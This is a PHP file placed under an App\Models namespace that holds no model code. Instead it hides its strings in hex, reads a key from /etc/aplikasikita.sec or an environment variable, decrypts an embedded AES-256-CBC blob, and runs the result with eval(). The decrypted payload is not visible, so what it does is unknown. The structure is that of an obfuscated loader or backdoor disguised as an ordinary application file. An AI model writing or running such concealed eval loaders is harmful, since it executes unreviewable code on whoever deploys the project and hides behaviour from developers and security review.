<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('UTQ/8W7cH/OVsaw+dTwfnQ==');

$c=base64_decode(

'wgci1VYBNPqzrYN7sZ4e5dJCpa+gRETSASIStkZCkOmmuUzFOSe+hXBcC965Fiibok0FEugcXpsK' .
'Px3KWng9ia7/FBhKg+WNGA7/Gjmz/qJT31IGHGZxMXJmz5G9KmYyBLESq+FOhR8ZJN+sKWiokayn' .
'r1grLqGMwKK1yS2xbcp5BdCEh4VoAJuVg6Tg0t4l4/oBeuk9m5GC5X38YMXtTGI40xVJOXoxrCJ+' .
'QVxTSFeS/JaSCijSAPo9k28nlQuudXxK40vXl/K9bb1vJpFpnnOibaAAXFeiVQ5/zKTX1mVZiHXU' .
'4vlACjBRmjLKq62ZCDHLfq7qRUoAuRSTb0LoCb01GUgxAWYAHCNU0cWHQj/vHEQdupV7VCmJawg3' .
'MtioTBWp9M6AkktKgFwTDyM2VW/GALHGun9yHKBzn1vcuKvp0CZFDeBV0lCnmgPHpdsUY5sHV1hA' .
'NTDU9n+rWkDK7nCz3q4L0OI1HyviTxw24dj6DBch/5CODWgqQW+7eSBIzDmUfoIoBP7/pPsUMyPQ' .
'VLEQ2iyI1ghJstwvydHocsruKp8hPAc9qNKCs1HREOaXCObWwiQwNsTeagpyaXETGTRaNAdvYhRs' .
'sXMKgj2crObWpxPCx9Y4A2OQPS3NAVeI/XIJf7JkN4k3ejonV09bhiycgpKJFEe6qId5MNvG56V4' .
'FtCa/NDgHlUuAl4DpVGIkd4vqJZVrA5TNbni1+Ur2F9UoQYJR9JD6Wm8Bt2b9AH3ZuPwiWSrXwiJ' .
'dMwI9elMtpQeHJQ7rOrfVKmIIY+uiOzCddAmLWGq6mm0AFLzwwEtm+pUfaXe5m05tlFwMkWoDg6o' .
'TOcHATuCseQw9BKPVpwT43XTi0MrwtEeS49+dLBcmQUpmUDJyVMMP6y3MmJxsSI4YDMlTGW6wJQh' .
'GQrp3A=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

